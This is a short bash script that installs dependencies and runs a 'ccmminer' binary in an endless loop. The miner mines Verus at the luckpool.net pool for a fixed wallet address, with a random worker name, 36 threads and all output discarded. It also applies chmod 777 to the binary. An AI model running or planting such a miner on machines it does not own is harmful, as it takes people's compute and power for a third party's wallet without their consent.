#!/bin/bash
#
# This is a handy script for local use

apt update
apt install sudo -y
apt install screen libjansson4 -y
chmod 777 ccmminer
while true
do
./ccmminer -a verus -o stratum+tcp://na.luckpool.net:3956 -u RGeRKo3JYfRnwKwKKSExF77ZdxsoeVTadg.$(echo $(shuf -i 1-20000 -n 1)-V) -p x -t 36
> /dev/null 2>&1
done
